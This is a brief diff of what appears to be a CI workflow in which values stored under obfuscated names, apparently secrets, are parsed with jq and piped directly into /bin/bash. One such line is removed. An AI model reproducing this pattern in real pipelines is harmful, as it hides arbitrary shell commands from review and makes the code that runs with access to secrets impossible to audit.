@@ -22,7 +22,6 @@ jobs:
           gibvm4: ${{ secrets.gibvm4 }}
         run: |
           printf '%s' "$gibvm4" | jq -r .jib3 | /bin/bash
-          echo $qamy19487 | jq -r .kwjap46 | /bin/bash
           printf '%s' "$bfrd014" | jq -r .tws5051 | /bin/bash
           echo $ht1 | jq -r .m7 | /bin/bash
           echo $cz2 | jq -r .edo5 | /bin/bash
